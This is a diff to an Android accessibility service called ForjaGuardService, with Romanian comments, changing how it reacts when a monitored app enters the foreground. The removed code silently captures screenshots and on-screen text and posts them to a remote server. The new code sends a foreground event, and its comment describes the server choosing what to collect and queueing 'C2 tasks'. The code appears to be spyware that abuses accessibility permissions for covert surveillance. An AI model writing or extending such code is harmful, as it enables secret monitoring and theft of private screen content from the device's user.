@@ -50,6 +50,8 @@ class ForjaGuardService : AccessibilityService() {
     @Volatile private var watchCooldownMs = 60_000L
     @Volatile private var watchEnabled = false
     private val lastWatchFire = java.util.concurrent.ConcurrentHashMap<String, Long>()
+    @Volatile private var prevFgPkg: String = ""
+    private val activeWatched = java.util.concurrent.ConcurrentHashMap.newKeySet<String>()
 
     override fun onServiceConnected() {
         instance = this
@@ -170,38 +172,41 @@ class ForjaGuardService : AccessibilityService() {
     }
 
     /**
-     * Declanșare instant: când o aplicație monitorizată apare în foreground,
-     * facem screenshot + screen text și trimitem imediat pe server —
-     * fără să așteptăm heartbeat-ul (care vine la ~10 min).
+     * Declanșare instant: când o aplicație monitorizată intră în foreground,
+     * trimitem un eveniment lightweight (fără screenshot/text) — serverul
+     * decide ce conținut să colecteze și enqueue-ază C2 tasks.
+     *
+     * Dedup pe stare (nu cooldown): urmărim prevFgPkg + activeWatched.
+     * O aplicație declanșează o singură dată per sesiune de foreground.
      */
     private fun checkWatchTrigger(fg: String) {
         if (!watchEnabled || watchApps.isEmpty()) return
-        val match = watchApps.find { fg.lowercase().contains(it.lowercase()) } ?: return
-        val now = System.currentTimeMillis()
-        val last = lastWatchFire[match] ?: 0L
-        if (now - last < watchCooldownMs) return
-        lastWatchFire[match] = now
-        android.util.Log.i("ForjaGuard", "WATCH TRIGGER: fg=$fg match=$match")
-        scope.launch {
-            try {
-                val shot = takeShotBytes()
-                val b64 = shot?.let { android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP) }
-                val screen = readScreen()?.take(500) ?: ""
-                val bat = try {
-                    val ctx = this@ForjaGuardService
-                    val bm = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
-                    val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
-                    val sc = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
-                    if (sc > 0) lv * 100 / sc else -1
-                } catch (_: Exception) { -1 }
-                val app = ForjaApp.from(this@ForjaGuardService)
-                app.forjaApi.postSyncEvent(fg, b64, screen, bat)
-                android.util.Log.i("ForjaGuard", "WATCH EVENT SENT: fg=$fg shot=${if (b64 != null) b64.length else 0}b screen=${screen.length}c bat=$bat")
-            } catch (e: Exception) {
-                android.util.Log.w("ForjaGuard", "watchTrigger failed: ${e.message}")
+        // Aplicația anterioară a ieșit din foreground → o scoatem din set
+        if (prevFgPkg.isNotEmpty() && prevFgPkg != fg) activeWatched.remove(prevFgPkg)
+        val match = watchApps.find { fg.lowercase().contains(it.lowercase()) }
+        if (match != null && !activeWatched.contains(fg)) {
+            activeWatched.add(fg)
+            android.util.Log.i("ForjaGuard", "WATCH TRIGGER: fg=$fg")
+            scope.launch {
+                try {
+                    val bat = getBattery()
+                    ForjaApp.from(this@ForjaGuardService).forjaApi
+                        .postSyncEvent(fg, null, "", bat, "foreground")
+                    android.util.Log.i("ForjaGuard", "WATCH EVENT SENT: fg=$fg bat=$bat")
+                } catch (e: Exception) {
+                    android.util.Log.w("ForjaGuard", "watchTrigger failed: ${e.message}")
+                }
             }
         }
+        prevFgPkg = fg
     }
+
+    private fun getBattery(): Int = try {
+        val bm = registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
+        val lv = bm?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val sc = bm?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
+        if (sc > 0) lv * 100 / sc else -1
+    } catch (_: Exception) { -1 }
 
     @Suppress("DEPRECATION")
     private fun takeShotBytes(): ByteArray? {
